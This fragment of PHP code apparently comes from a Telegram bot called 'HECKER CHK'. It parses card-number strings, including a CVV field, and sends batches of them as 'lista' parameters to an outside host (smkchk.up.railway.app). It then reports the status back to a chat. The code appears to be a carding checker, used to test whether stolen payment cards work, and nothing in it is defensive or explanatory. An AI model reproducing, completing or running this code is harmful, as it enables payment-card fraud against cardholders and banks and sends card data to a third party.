...
$cvvz5 = multiexplode(array(":", "/", " ", "|"), $cc5)[3];
  ...
  $r1 = file_get_contents('https://smkchk.up.railway.app/modules/mch.php?lista='.$lista1.'');
  ...
  editMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A$ccr1</b>",$mes_id);
    $r2 = file_get_contents('https://smkchk.up.railway.app/modules/mch.php?lista='.$lista2.'');
  ...
  $r3 = file_get_contents('https://smkchk.up.railway.app/modules/mch.php?lista='.$lista3.'');
  ...
  editMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3</b>",$mes_id);
    $r4 = file_get_contents('https://smkchk.up.railway.app/modules/mch.php?lista='.$lista4.'');
  ...
  $r5 = file_get_contents('https://smkchk.up.railway.app/modules/mch.php?lista='.$lista5.'');
